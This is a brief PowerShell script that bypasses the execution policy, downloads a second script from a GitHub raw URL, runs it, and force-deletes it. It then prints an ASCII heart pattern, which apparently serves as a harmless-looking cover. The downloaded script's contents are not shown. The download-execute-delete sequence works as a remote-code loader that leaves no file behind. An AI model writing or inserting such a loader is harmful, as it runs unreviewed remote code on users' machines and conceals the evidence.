Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

$scriptPath = "$PSScriptRoot\temp_2.ps1"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/truongcp0305/dp/main/2.ps1" -OutFile $scriptPath

& $scriptPath

Remove-Item $scriptPath -Force

# Start-Process "https://ncsgroup.vn/"

for ($y = 15; $y -ge -15; $y--) {
    $line = ""
    for ($x = -30; $x -le 30; $x++) {
        $a = [math]::Pow(($x * 0.05), 2) + [math]::Pow(($y * 0.1), 2) - 1
        if ([math]::Pow($a, 3) - [math]::Pow(($x * 0.05), 2) * [math]::Pow(($y * 0.1), 3) -le 0) {
            $line += "*"
        } else {
            $line += " "
        }
    }
    Write-Host $line
}